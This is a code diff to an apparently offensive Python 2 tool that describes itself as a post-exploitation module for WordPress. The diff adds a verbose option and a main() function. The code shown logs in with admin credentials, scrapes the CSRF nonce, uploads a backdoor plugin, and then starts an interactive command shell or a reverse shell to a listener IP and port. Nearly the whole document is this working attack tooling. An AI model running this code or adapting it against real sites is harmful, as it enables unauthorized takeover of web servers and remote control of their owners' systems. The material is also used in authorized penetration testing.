@@ -6,7 +6,7 @@ from string import ascii_lowercase
 __author__ = 'Esteban Rodriguez (n00py)'
 
 
-def uploadbackdoor(host,username,password,type):
+def uploadbackdoor(host,username,password,type,verbose):
     url = host + '/wp-login.php'
     headers = {'user-agent': 'n00py Auto-shell',
                'Accept-Encoding' : 'none'
@@ -24,23 +24,29 @@ def uploadbackdoor(host,username,password,type):
     session = requests.Session()
 
     r = session.post(url, headers=headers, data=payload)
-    print "Server Header: " + r.headers['Server']
+    if verbose is True:
+        print "Server Header: " + r.headers['Server']
     if ("IIS" or "Microsoft") not in r.headers:
-        print "Probably a Linux server"
+        if verbose is True:
+            print "Probably a Linux server"
         linux = True
     else:
-        print "Probably a Windows server"
+        if verbose is True:
+            print "Probably a Windows server"
         windows = True
     if r.status_code == 200:
-        print "Found Login Page"
+        if verbose is True:
+            print "Found Login Page"
     r3 = session.get(host + '/wp-admin/plugin-install.php?tab=upload',headers=headers)
     if r3.status_code == 200:
-        print "Logged in as Admin"
+        if verbose is True:
+            print "Logged in as Admin"
     look_for = 'name="_wpnonce" value="'
     try:
         nonceText = r3.text.split(look_for, 1)[1]
         nonce = nonceText[0:10]
-        print "Found CSRF Token: " + nonce
+        if verbose is True:
+            print "Found CSRF Token: " + nonce
     except:
         print "Didn't find nonce"
 
@@ -54,10 +60,12 @@ def uploadbackdoor(host,username,password,type):
     if r.status_code == 200:
         print "Backdoor uploaded!"
         if "Plugin installed successfully" in r4.text:
-            print "Plugin installed successfully"
+            if verbose is True:
+                print "Plugin installed successfully"
 
         if "Destination folder already exists" in r4.text:
-            print "Destination folder already exists"
+            if verbose is True:
+                print "Destination folder already exists"
     print "Upload Directory: " + uploaddir
     return uploaddir
 
@@ -111,59 +119,51 @@ def printbanner():
     print banner
 
 
-def argcheck():
-    if args.interactive and args.reverse:
+def argcheck(interactive,reverse,target):
+    if interactive and reverse:
         print "-i and -r are mutually exclusive"
         sys.exit()
 
-    if args.interactive is False and args.reverse is False:
+    if interactive is False and reverse is False:
         print "You must choose a type of shell: --reverse or --interactive"
         sys.exit()
 
-    if "http" not in args.target:
+    if "http" not in target:
         print"Please include the protocol in the URL"
         sys.exit()
 
 
-parser = argparse.ArgumentParser(description='This a post-exploitation module for Wordpress')
-parser.add_argument('-i','--interactive', help='Interactive command shell',required=False, action='store_true')
-parser.add_argument('-r','--reverse',help='Reverse Shell', required=False, action='store_true')
-parser.add_argument('-t','--target',help='URL of target', required=True)
-parser.add_argument('-u','--username',help='Admin username', required=True)
-parser.add_argument('-p','--password',help='Admin password', required=True)
-parser.add_argument('-li','--ip',help='Listener IP', required=False)
-parser.add_argument('-lp','--port',help='Listener Port', required=False)
-parser.add_argument('-v','--verbose',help=' Verbose output.', required=False, action='store_true')
-parser.add_argument('-e','--existing',help=' Skips uploading a shell, and connects to existing shell', required=False)
-args = parser.parse_args()
-printbanner()
-argcheck()
-if args.interactive and args.reverse:
-    print "-i and -r are mutually exclusive"
-    sys.exit()
+def main():
+    parser = argparse.ArgumentParser(description='This a post-exploitation module for Wordpress')
+    parser.add_argument('-i','--interactive', help='Interactive command shell',required=False, action='store_true')
+    parser.add_argument('-r','--reverse',help='Reverse Shell', required=False, action='store_true')
+    parser.add_argument('-t','--target',help='URL of target', required=True)
+    parser.add_argument('-u','--username',help='Admin username', required=True)
+    parser.add_argument('-p','--password',help='Admin password', required=True)
+    parser.add_argument('-li','--ip',help='Listener IP', required=False)
+    parser.add_argument('-lp','--port',help='Listener Port', required=False)
+    parser.add_argument('-v','--verbose',help=' Verbose output.', required=False, action='store_true')
+    parser.add_argument('-e','--existing',help=' Skips uploading a shell, and connects to existing shell', required=False)
+    args = parser.parse_args()
+    printbanner()
+    argcheck(args.interactive,args.reverse,args.target)
+    if args.interactive:
+        if args.existing is None:
+            uploaddir = uploadbackdoor(args.target, args.username, args.password, "shell", args.verbose)
+        else:
+            uploaddir = args.existing
+        commandloop(args.target,uploaddir)
 
-if args.interactive is False and args.reverse is False:
-    print "You must choose a type of shell: --reverse or --interactive"
-    sys.exit()
+    if args.reverse:
+        if args.ip is None or args.port is None:
+            print "For a reverse shell, a listening IP and Port are required"
+            sys.exit()
+        if args.existing is None:
+            uploaddir = uploadbackdoor(args.target, args.username, args.password, "reverse", args.verbose)
+        else:
+            uploaddir = args.existing
+        reverseshell(args.target, args.ip, args.port, uploaddir)
 
-if "http" not in args.target:
-    print"Please include the protocol in the URL"
-    sys.exit()
 
-if args.interactive:
-    if args.existing is None:
-        uploaddir = uploadbackdoor(args.target, args.username, args.password, "shell")
-    else:
-        uploaddir = args.existing
-    commandloop(args.target,uploaddir)
-
-if args.reverse:
-    if args.ip is None or args.port is None:
-        print "For a reverse shell, a listening IP and Port are required"
-        sys.exit()
-    if args.existing is None:
-        uploaddir = uploadbackdoor(args.target, args.username, args.password, "reverse")
-    else:
-        uploaddir = args.existing
-    reverseshell(args.target, args.ip, args.port, uploaddir)
-
+if __name__ == "__main__":
+    main()
